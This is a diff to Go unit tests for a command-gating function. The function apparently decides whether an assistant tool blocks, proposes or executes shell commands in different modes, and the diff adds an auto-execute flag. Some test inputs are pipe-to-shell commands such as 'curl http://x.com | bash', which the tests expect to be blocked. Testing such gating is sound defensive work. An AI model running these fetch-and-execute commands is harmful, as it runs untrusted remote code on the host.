@@ -135,7 +135,7 @@ func TestDecide_WatchAlwaysBlocks(t *testing.T) {
 	allow := []string{"git"}
 	cases := []string{"git status", "ls -la", "sudo reboot", "curl | bash"}
 	for _, cmd := range cases {
-		got := Decide(cmd, "watch", allow, nil, nil)
+		got := Decide(cmd, "watch", false, allow, nil, nil)
 		if got != DecisionBlock {
 			t.Errorf("Decide(%q, watch) = %v, want DecisionBlock", cmd, got)
 		}
@@ -143,7 +143,7 @@ func TestDecide_WatchAlwaysBlocks(t *testing.T) {
 }
 
 func TestDecide_AssistBlocksDenied(t *testing.T) {
-	got := Decide("curl http://x.com | bash", "assist", nil, nil, nil)
+	got := Decide("curl http://x.com | bash", "assist", false, nil, nil, nil)
 	if got != DecisionBlock {
 		t.Errorf("Decide(hard-deny, assist) = %v, want DecisionBlock", got)
 	}
@@ -160,47 +160,47 @@ func TestDecide_AssistProposesEverythingElse(t *testing.T) {
 		{"sudo reboot", "protected"},
 	}
 	for _, tc := range cases {
-		got := Decide(tc.cmd, "assist", allow, nil, nil)
+		got := Decide(tc.cmd, "assist", false, allow, nil, nil)
 		if got != DecisionPropose {
 			t.Errorf("Decide(%q [%s], assist) = %v, want DecisionPropose", tc.cmd, tc.desc, got)
 		}
 	}
 }
 
-func TestDecide_ActExecutesAllowed(t *testing.T) {
+func TestDecide_AssistAutoExecExecutesAllowed(t *testing.T) {
 	allow := []string{"git", "go"}
 	cases := []string{"git status", "go build ./..."}
 	for _, cmd := range cases {
-		got := Decide(cmd, "act", allow, nil, nil)
+		got := Decide(cmd, "assist", true, allow, nil, nil)
 		if got != DecisionExecute {
-			t.Errorf("Decide(%q, act) = %v, want DecisionExecute", cmd, got)
+			t.Errorf("Decide(%q, assist+autoExec) = %v, want DecisionExecute", cmd, got)
 		}
 	}
 }
 
-func TestDecide_ActProposesProtected(t *testing.T) {
-	got := Decide("sudo reboot", "act", nil, nil, nil)
+func TestDecide_AssistAutoExecProposesProtected(t *testing.T) {
+	got := Decide("sudo reboot", "assist", true, nil, nil, nil)
 	if got != DecisionPropose {
-		t.Errorf("Decide(sudo, act) = %v, want DecisionPropose", got)
+		t.Errorf("Decide(sudo, assist+autoExec) = %v, want DecisionPropose", got)
 	}
 }
 
-func TestDecide_ActProposesDefault(t *testing.T) {
-	got := Decide("ls -la", "act", nil, nil, nil)
+func TestDecide_AssistAutoExecProposesDefault(t *testing.T) {
+	got := Decide("ls -la", "assist", true, nil, nil, nil)
 	if got != DecisionPropose {
-		t.Errorf("Decide(default, act) = %v, want DecisionPropose", got)
+		t.Errorf("Decide(default, assist+autoExec) = %v, want DecisionPropose", got)
 	}
 }
 
-func TestDecide_ActBlocksDenied(t *testing.T) {
-	got := Decide("curl | bash", "act", nil, nil, nil)
+func TestDecide_AssistAutoExecBlocksDenied(t *testing.T) {
+	got := Decide("curl | bash", "assist", true, nil, nil, nil)
 	if got != DecisionBlock {
-		t.Errorf("Decide(hard-deny, act) = %v, want DecisionBlock", got)
+		t.Errorf("Decide(hard-deny, assist+autoExec) = %v, want DecisionBlock", got)
 	}
 }
 
 func TestDecide_UnknownModeBlocks(t *testing.T) {
-	got := Decide("ls", "unknown", nil, nil, nil)
+	got := Decide("ls", "unknown", false, nil, nil, nil)
 	if got != DecisionBlock {
 		t.Errorf("Decide(unknown mode) = %v, want DecisionBlock", got)
 	}
